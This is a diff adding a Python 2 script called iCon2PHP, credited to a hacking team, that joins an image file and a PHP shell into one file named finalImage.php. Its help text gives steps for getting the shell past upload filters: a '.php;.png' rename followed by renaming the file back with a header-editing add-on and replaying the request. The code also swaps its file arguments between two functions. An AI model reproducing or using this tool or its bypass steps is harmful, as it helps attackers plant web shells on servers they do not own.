@@ -1,0 +1,111 @@
+# Variables
+enterr="Please Press <ENTER> to Proceed....\n"
+sepBig="  		_____________________________________________________________________\n"
+sepSmall="			_________________________________	\n"
+
+def help_func():
+	### Start of Help ###
+	print(sepBig)
+	print("Help: \n\n")
+	print(sepSmall)
+	# Path and File Problems
+	print("   Commands to find the file on your HDD:\n")
+	print("		file.php   		| If file is located at the current directory")
+	print("		../file.php		| If file is located at the directory containing the current (The previous one...)")
+	print("		../oneFolder/file.php	| If file is located at a directory named (ex.) 'oneFolder' which is located at the previous folder\n\n")
+	print(sepSmall)
+	# Shell Uploading Problems
+	print("   If you have problems while uploading the shell:\n")
+	print("	     Recommended Method:")
+	print("		1. Try to rename the file from 'finalImage.php' to 'finalImage.php;.png' where instead of 'png' is the type of the image you binded (connected).")
+	print("		2. Now, reupload the file.")		
+	print("		3. Use 'HTTP Live Headers' Add-on for Firefox to rename your file back to 'finalImage.php' and hit 'Replay'")
+	print("	     A huge amount of Tutorials are on the Web. Just search Google to find some. \n		I would also recommend the Hackforums website for support and discussion on Security and Hacking.    (  hackforums.net   )\n\n")
+	print(sepSmall)
+	# Info
+	print("\n\n\n   Info about us:\n")
+	print("		-Developed by:		Akatzbreaker")
+	print("		-From:			G.N.A. Hack Team")
+	print("		-Website:		gnahackteam.wordpress.com")
+	print("\n	More Info at our website....\n\n")
+	print("\n\n\n\n It should be better if you run this program as ROOT since there may be conflicts with the File Creation. \n")
+	print(sepBig)
+	### End of Help ###
+	continue_to_prog=raw_input("\n\nContinue to Program? Y/n   ")
+	if continue_to_prog == 'n' or continue_to_prog == 'N':
+		exit()
+	else:
+		enter_files()
+
+def bind_to_php(imager,sheller):
+	print("Starting Proccess to create PHP-Image Shell...\n\n\n\n")
+	
+	# Adding image to finalImage Variable
+	print("Adding Image's code to File...\n")
+	finalImage=open(imager,'rb').read()
+
+	#Adding PHP to finalImage Variable
+	print("Adding PHP's code to File...\n")
+	finalImage+=open(sheller,'rb').read()
+	
+	#Creating finalImage.php at the current Directory
+	print("Creating File....\n\n")
+	try:
+		open("finalImage.php",'w').write(finalImage)
+		print("File: 'finalImage.php' has been successfully created at the Current Directory...\n\n")
+	except:
+		print("Something Wrong Happened and the file wasn't created properly...\n\n")
+		print("Try to change the program's permissions OR run as root\n (There may be some permission problems)\n\n")
+
+
+def check_files(sheller,imager):
+	# Checking PHP/Shell file
+	try:
+		checker=open(sheller,'r')
+		phpContent=checker.readlines()
+		if len(phpContent) == 0:
+			print("Invalid Path or Empty File!\n")
+			print("Please check your path or PHP file and Retry!\n\n")
+			exit()
+		else:
+			print("Valid Files!\n")
+			raw_input(enterr)
+
+			bind_to_php(imager,sheller)
+		#Checking Image File
+		checker2=open(imager,'r')
+		imageContent=checker2.readlines()	
+		if len(imageContent) == 0:
+			print("Invalid Path or Image File!\n")
+			print("Please check your path or Image files and Retry!\n\n")
+	except:
+		print("No such File or Path! Please check your files and retry!")
+		exit()
+
+def enter_files():
+	# Enter Image
+	imager=raw_input("Enter the Path of your Image:   ")
+
+	# Enter PHP
+	sheller=raw_input("Please enter the path to the PHP:   ")
+	print("Entered!\n\n")
+
+	check_files(imager,sheller)
+
+def initialisation():
+	print("\n\nWelcome to iCon2PHP - V1.2 - Created by Akatzbreaker\n")
+	print("(( For any questions, please read the text files included at the archive or consult the help included in this program ))\n\n")
+	raw_input(enterr)
+	help_or_prog=raw_input("Display Help First? Y/n   ")
+	if help_or_prog == 'Y' or help_or_prog == 'y':
+		print("Displaying Help\n\n\n")
+		help_func()
+	else:
+		print("Starting Check proccess to confirm file paths...\n")
+		enter_files()
+
+
+initialisation()
+print("Developer by	 Akatzbreaker from the G.N.A. Hack Team")
+print("Visit us at:	 gnahacteam.wordpress.com")
+raw_input("Press <Enter> to Exit\n\n")
